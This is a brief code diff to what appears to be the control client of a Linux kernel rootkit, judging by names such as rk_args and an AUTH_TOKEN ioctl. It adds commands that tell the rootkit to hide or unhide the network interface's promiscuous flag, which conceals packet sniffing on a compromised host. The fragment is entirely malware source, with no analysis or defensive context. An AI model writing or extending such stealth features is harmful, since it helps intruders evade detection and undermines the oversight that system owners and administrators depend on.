@@ -225,6 +225,18 @@ int main ( int argc, char *argv[] )
             }
             break;
 
+        case 13:
+            printf("Hiding network PROMISC flag\n");
+            rk_args.cmd = 13;
+            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            break;
+
+        case 14:
+            printf("Unhiding network PROMISC flag\n");
+            rk_args.cmd = 14;
+            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            break;
+
         case 100:
             {
                 printf("Null command\n");
